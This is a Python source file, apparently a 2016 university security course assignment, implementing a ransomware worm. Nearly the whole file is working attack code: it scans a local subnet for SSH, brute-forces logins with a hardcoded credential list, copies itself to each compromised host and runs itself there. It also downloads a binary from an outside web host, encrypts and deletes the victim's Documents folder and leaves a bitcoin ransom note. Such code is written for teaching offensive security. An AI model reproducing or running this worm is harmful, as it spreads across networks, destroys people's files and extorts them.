#!/usr/bin/python

# CPSC 456 - Assignment 1
# Professor Gofman
# Due: 21 October 2016

# Team:
# Micah Geertson - micahgeertson@gmail.com
# Joshua Womack - jdwomack@csu.fullerton.edu

import paramiko
import sys
import socket
import nmap
import fcntl
import struct
import netifaces
import tarfile
import os
import urllib
import shutil

from subprocess import call



# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu', '123456')
]


# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
EXTORTION_FILE = "Desktop/Ransom_Note-Read_Immediately.txt"
EXTORTION_NOTE = "Your personal files have been encrypted. To re-gain access to them, you need to purchase the decryption key.\n\n Send 43 bitcoin to:\n 27hfkrTJu848jdhdjFAXgdu88h"
DOCUMENTS_DIR = "Documents/"
TAR_DIR = "Documents.tar"
HOME_CREDS = '192.168.1.6'


##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(ssh):
    # DONE:
    # Check if the system as infected. One
    # approach is to check for a file called
    # infected.txt in directory /tmp (which
    # you created when you marked the system
    # as infected).

    try:
        # Create an instance of the SFTP class; used for
        # uploading/downloading files and executing commands
        sftpClient = ssh.open_sftp()

        # Check if the file exists
        sftpClient.stat(INFECTED_MARKER_FILE)
        sftpClient.close()
        print "System already infected, moving on."
        return True

    # The file does not exist
    except IOError, e:
        print "and we're in!"
        markInfectedAndSpread(sftpClient)
        sftpClient.close()
        return False


#################################################################
# Marks the system as infected
#################################################################
def markInfectedAndSpread(sftpClient):

    # Mark the system as infected. One way to do
    # this is to create a file called infected.txt
    # in directory /tmp/

    # Copy this worm to the remote system
    sftpClient.put("/tmp/extorter_worm.py", "/tmp/extorter_worm.py")
    sftpClient.put(INFECTED_MARKER_FILE, INFECTED_MARKER_FILE)



###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def executeWorm(sshClient):

    # This function takes as a parameter
    # an instance of the SSH class which
    # was properly initialized and connected
    # to the victim system. The worm will
    # change its permissions to executable,
    # and execute itself.

    # Make the worm file executable on the remote system
    sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")

    # Execute the worm
    sshClient.exec_command("nohup python /tmp/extorter_worm.py &")



############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, username, password, sshClient):

    # Tries to connect to host host using
    # the username stored in variable userName
    # and password stored in variable password
    # and instance of SSH class sshClient.
    # If the server is down or has some other
    # problem, connect() function which you will
    # be using will throw socket.error exception.
    # Otherwise, if the credentials are not
    # correct, it will throw
    # paramiko.SSHException exception.
    # Otherwise, it opens a connection
    # to the victim system; sshClient now
    # represents an SSH connection to the
    # victim. Most of the code here will
    # be almost identical to what we did
    # during class exercise. Please make
    # sure you return the values as specified
    # in the comments above the function
    # declaration (if you choose to use
    # this skeleton).

    try:
        print "Attacking host: " + host + "...",
        sshClient.connect(host, 22, username, password)
        isInfected = isInfectedSystem(sshClient)
        return 0, isInfected

    except paramiko.ssh_exception.AuthenticationException:
        print "Wrong credentials."
        return 1, None

    except socket.error, v:
        print v
        return 3, None


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def dictAttack(host):

    # The credential list
    global credList

    global ssh
    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None

    # Go through the credentials
    for (username, password) in credList:

        attemptResults, isInfected = tryCredentials(host, username, password, ssh)

        if attemptResults == 0:
            # if host is already infected, return False so this host can be skipped
            if isInfected:
                return False
            else:
                return (ssh, username, password)

    # Could not find working credentials
    return None

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():
    # Get all the network interfaces on the system
    networkInterfaces = netifaces.interfaces()

    # Retrieve and return the IP of the current system
    ipAddr = None

    for netFace in networkInterfaces:
        addr = netifaces.ifaddresses('eth0')[2][0]['addr']

        if not addr == '127.0.0.1':
            ipAddr = addr
            break

    return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
    # Scanning for hosts on the same network
    # and returning the list of discovered
    # IP addresses.
    portScanner = nmap.PortScanner()

    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

    hostInfo = portScanner.all_hosts()

    liveHosts = []

    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host)

    return liveHosts


################################################################
# Encrypts the Documents directory and demands ransom
# @param - None
# @return - None
################################################################
def extortSystem(currentIP):
    # Execute if not on the attacker's machine
    if not HOME_CREDS == currentIP:
        # Download SSL Encyption Software
        urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")

        # Make SSL Encryption Software executable on remote system
        call(["chmod", "a+x", "/tmp/openssl"])

        # Archive Documents directory
        tar = tarfile.open(TAR_DIR, "w:gz")

        # Add the Documents directory
        tar.add(DOCUMENTS_DIR)

        # Close tar
        tar.close()

        # Encrypt directory
        call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", TAR_DIR, "-out", TAR_DIR + ".enc", "-k", "cs456worm"])

        # Leave ransom note on Desktop
        ransomNote = open(EXTORTION_FILE, "w")
        ransomNote.write(EXTORTION_NOTE)
        ransomNote.close()

        # Delete Documents directory and Documents.tar file
        shutil.rmtree(DOCUMENTS_DIR)
        os.remove(TAR_DIR)

    else:
        print "Initial execution, not infecting home server."



################################################################
# Main
# @param - None
# @return - None
################################################################
def main():
    # Get the IP of the current system
    hostIP = getMyIP()

    extortSystem(hostIP)

    # Get the hosts on the same network
    networkHosts = getHostsOnTheSameNetwork()

    # Remove the IP of the current system
    # from the list of discovered systems (we
    # do not want to target ourselves!).
    if hostIP in networkHosts:
        networkHosts.remove(hostIP)

    print "\nMy IP: ", hostIP
    print "Found hosts: ", networkHosts
    print


    # Go through the network hosts
    for host in networkHosts:

        # Try to attack this host
        sshInfo =  dictAttack(host)
        print

        # Did the attack succeed?
        if sshInfo:
            print 'Successful Credential:'
            print '\tIP: {}\n\tUsername: {}\n\tPassword: {}'.format(hostIP, sshInfo[1], sshInfo[2])
            print "\nTrying to spread..."

            executeWorm(sshInfo[0])
            print "Spread like butter."
            ssh.close()
            exit()


if __name__ == "__main__":
    main()
